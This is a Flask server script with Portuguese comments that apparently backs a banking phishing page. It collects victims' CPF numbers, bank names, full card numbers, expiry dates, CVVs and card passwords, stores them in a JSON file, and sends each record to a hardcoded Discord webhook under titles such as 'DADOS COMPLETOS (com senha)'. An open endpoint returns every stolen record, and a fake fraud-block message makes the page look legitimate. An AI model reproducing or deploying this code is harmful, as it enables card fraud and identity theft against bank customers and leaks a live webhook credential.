from flask import Flask, request, jsonify, send_from_directory, render_template
import os
import json
from datetime import datetime
import requests

app = Flask(__name__, 
           static_folder='static',
           template_folder='templates')

# ===== CONFIGURAÇÕES =====
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1488642907417346242/BYCMQrQ_po5L4LpyPHFwO7fiOhB5K78q9440PundIrI2c_NYtvHAesiuo9xMIAcNZ-x0"
DADOS_FILE = 'dados.json'

# ===== FUNÇÕES DE ARQUIVO =====
def ler_dados():
    """Lê o arquivo JSON com os dados. Retorna uma lista vazia se o arquivo não existir ou estiver vazio."""
    if not os.path.exists(DADOS_FILE):
        return []
    try:
        with open(DADOS_FILE, 'r', encoding='utf-8') as f:
            conteudo = f.read().strip()
            if not conteudo:
                return []
            return json.loads(conteudo)
    except json.JSONDecodeError:
        return []

def escrever_dados(dados):
    """Escreve a lista de dados no arquivo JSON."""
    with open(DADOS_FILE, 'w', encoding='utf-8') as f:
        json.dump(dados, f, indent=2, ensure_ascii=False)

# ===== FUNÇÕES DE DISCORD =====
def enviar_para_discord(dados):
    """Envia os dados para o Discord via webhook."""
    if not DISCORD_WEBHOOK_URL or "SEU_ID" in DISCORD_WEBHOOK_URL:
        print("Webhook não configurado. Dados não enviados.")
        return

    if dados.get('completo'):
        titulo = "💳 DADOS COMPLETOS (com senha)"
        desc = f"**CPF:** {dados['cpf']}\n**Banco:** {dados['banco']}\n**Cartão:** {dados['dadosCartao']['numero']}\n**Validade:** {dados['dadosCartao']['validade']}\n**CVV:** {dados['dadosCartao']['cvv']}\n**Senha:** {dados['senha']}"
        cor = 65280
    else:
        titulo = "🚨 DADOS DE CARTÃO (parcial)"
        desc = f"**CPF:** {dados['cpf']}\n**Banco:** {dados['banco']}\n**Cartão:** {dados['dadosCartao']['numero']}\n**Validade:** {dados['dadosCartao']['validade']}\n**CVV:** {dados['dadosCartao']['cvv']}"
        cor = 16711680

    payload = {
        "content": None,
        "embeds": [
            {
                "title": titulo,
                "description": desc,
                "color": cor,
                "timestamp": dados.get('dataHora', datetime.now().isoformat())
            }
        ]
    }
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        response.raise_for_status()
        print("Mensagem enviada ao Discord com sucesso.")
    except Exception as e:
        print(f"Erro ao enviar para Discord: {e}")

# ===== ROTAS =====
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/validar-cpf', methods=['POST'])
def validar_cpf():
    data = request.get_json()
    cpf = data.get('cpf', '')
    cpf_limpo = ''.join(filter(str.isdigit, cpf))

    if cpf_limpo == '11111111111':
        return jsonify({'valido': False, 'mensagem': 'CPF bloqueado por suspeita de fraude.'})

    if len(cpf_limpo) != 11:
        return jsonify({'valido': False, 'mensagem': 'CPF deve ter 11 dígitos.'})

    if not validar_digitos_cpf(cpf_limpo):
        return jsonify({'valido': False, 'mensagem': 'CPF inválido (dígitos verificadores).'})

    return jsonify({'valido': True})

def validar_digitos_cpf(cpf):
    if len(cpf) != 11 or cpf == cpf[0] * 11:
        return False
    soma = sum(int(cpf[i]) * (10 - i) for i in range(9))
    resto = (soma * 10) % 11
    if resto == 10:
        resto = 0
    if resto != int(cpf[9]):
        return False
    soma = sum(int(cpf[i]) * (11 - i) for i in range(10))
    resto = (soma * 10) % 11
    if resto == 10:
        resto = 0
    if resto != int(cpf[10]):
        return False
    return True

@app.route('/api/salvar-cartao', methods=['POST'])
def salvar_cartao():
    dados = request.get_json()
    cpf = dados.get('cpf')
    banco = dados.get('banco')
    dados_cartao = dados.get('dadosCartao')

    if not cpf or not banco or not dados_cartao:
        return jsonify({'sucesso': False, 'mensagem': 'CPF, banco e dados do cartão são obrigatórios.'}), 400

    todos = ler_dados()
    novo_registro = {
        'cpf': cpf,
        'banco': banco,
        'dadosCartao': dados_cartao,
        'completo': False,
        'senha': None,
        'dataHora': datetime.now().isoformat()
    }

    atualizado = False
    for i, reg in enumerate(todos):
        if reg.get('cpf') == cpf and not reg.get('completo', False):
            todos[i] = novo_registro
            atualizado = True
            break
    if not atualizado:
        todos.append(novo_registro)

    escrever_dados(todos)
    enviar_para_discord(novo_registro)

    print(f"Dados de cartão salvos para CPF {cpf}.")
    return jsonify({'sucesso': True})

@app.route('/api/enviar-senha', methods=['POST'])
def enviar_senha():
    data = request.get_json()
    cpf = data.get('cpf')
    senha = data.get('senha')

    if not cpf or not senha:
        return jsonify({'sucesso': False, 'mensagem': 'CPF e senha são obrigatórios.'}), 400

    todos = ler_dados()
    registro_completo = None
    for i, reg in enumerate(todos):
        if reg.get('cpf') == cpf and not reg.get('completo', False):
            reg['senha'] = senha
            reg['completo'] = True
            reg['dataHora'] = datetime.now().isoformat()
            registro_completo = reg
            break

    if registro_completo is None:
        return jsonify({'sucesso': False, 'mensagem': 'Nenhum registro pendente encontrado para este CPF.'}), 404

    escrever_dados(todos)
    enviar_para_discord(registro_completo)

    print(f"Senha adicionada para CPF {cpf}.")
    return jsonify({'sucesso': True})

@app.route('/api/consultar', methods=['GET'])
def consultar():
    return jsonify(ler_dados())

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))